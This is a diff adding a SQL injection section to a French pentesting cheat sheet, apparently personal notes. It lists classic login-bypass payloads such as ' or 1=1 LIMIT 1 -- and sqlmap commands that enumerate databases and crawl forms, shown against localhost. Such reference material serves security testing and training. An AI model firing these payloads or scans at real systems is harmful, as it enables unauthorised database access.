@@ -82,3 +82,32 @@ Bypass 403 / 401
 * Fuzz HTTP Headers avec [ce tool](https://github.com/carlospolop/fuzzhttpbypass)
 * Changer le protocole : HTTP -> HTTPS ou inversement
 * Vérifier si la ressource était accessible dans le passé via [archive.org](https://archive.org/web/)
+
+<br/>
+
+Injections
+======
+SQL INJECTIONS
+======
+Tests classiques
+* ' or 1=1 LIMIT 1 --
+* ' or 1=1 LIMIT 1 -- -
+* ' or 1=1 LIMIT 1#
+* 'or 1#
+* ' or 1=1 --
+* ' or 1=1 -- -
+* admin\'-- -
+
+<br/>
+SQLMap - Cheatsheet
+<br/>POST
+
+* sqlmap -r req.txt -p pass
+
+<br/>GET
+
+* sqlmap -u "http://127.0.0.1/index.php?id=1" --dbs
+
+<br/>AUTO - FORMS
+
+* sqlmap -u 'http://127.0.0.1/index.php' --forms --dbs --risk=3 --level=5 --threads=4 --batch
